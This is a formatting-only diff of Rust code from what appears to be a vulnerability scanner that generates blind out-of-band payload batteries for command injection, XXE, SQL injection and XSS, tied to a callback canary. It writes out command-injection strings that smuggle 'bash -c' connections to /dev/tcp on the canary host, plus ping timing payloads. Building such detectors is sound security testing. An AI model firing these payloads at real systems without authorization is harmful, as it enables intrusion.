@@ -118,14 +118,19 @@ pub fn embed_blind_cmdi_battery(canary: &OobCanary) -> Vec<String> {
     // or `|`. The `cat` write is harmless (the canary's TCP listener
     // accepts and discards bytes); the connect itself is the signal.
     out.push(format!("; bash -c 'cat </dev/tcp/{dns}/80' 2>/dev/null"));
-    out.push(format!("&& bash -c 'echo probe >/dev/tcp/{dns}/80' 2>/dev/null"));
+    out.push(format!(
+        "&& bash -c 'echo probe >/dev/tcp/{dns}/80' 2>/dev/null"
+    ));
     out.push(format!("| bash -c ':>/dev/tcp/{dns}/80' 2>/dev/null"));
     // Long-ping timing channel — pad count so the delay is
     // unmistakable against typical 200 ms request latency. -c 10 on
     // a 1-second-interval ping gives ~9 s of delay.
     out.push(format!("; ping -c 10 127.0.0.1"));
     out.push(format!("&& ping -n 10 127.0.0.1"));
-    out.into_iter().collect::<std::collections::BTreeSet<_>>().into_iter().collect()
+    out.into_iter()
+        .collect::<std::collections::BTreeSet<_>>()
+        .into_iter()
+        .collect()
 }
 
 /// Battery of blind XXE payload variants exfiltrating to `canary`'s HTTP URL.
@@ -171,10 +176,7 @@ mod battery_tests {
             canary.expected_dns, canary.expected_http_path
         );
         for (i, v) in battery.iter().enumerate() {
-            assert!(
-                v.contains(&expected),
-                "battery[{i}] missing url: {v}"
-            );
+            assert!(v.contains(&expected), "battery[{i}] missing url: {v}");
         }
         assert!(battery.len() >= 8, "xss battery too small");
     }
@@ -191,23 +193,23 @@ mod battery_tests {
     #[test]
     fn sqli_mysql_battery_uses_dns_for_unc() {
         let canary = make_canary();
-        let battery =
-            embed_blind_sqli_battery(&canary, interactsh::SqliDialect::MySql);
+        let battery = embed_blind_sqli_battery(&canary, interactsh::SqliDialect::MySql);
         for v in &battery {
             assert!(
                 v.contains(&canary.expected_dns),
                 "MySQL variant missing DNS: {v}"
             );
-            assert!(!v.contains(&canary.expected_http_path),
-                "MySQL UNC variant should NOT carry HTTP path: {v}");
+            assert!(
+                !v.contains(&canary.expected_http_path),
+                "MySQL UNC variant should NOT carry HTTP path: {v}"
+            );
         }
     }
 
     #[test]
     fn sqli_postgres_battery_uses_full_http_url() {
         let canary = make_canary();
-        let battery =
-            embed_blind_sqli_battery(&canary, interactsh::SqliDialect::Postgres);
+        let battery = embed_blind_sqli_battery(&canary, interactsh::SqliDialect::Postgres);
         for v in &battery {
             assert!(
                 v.contains(&format!("http://{}", canary.expected_dns)),
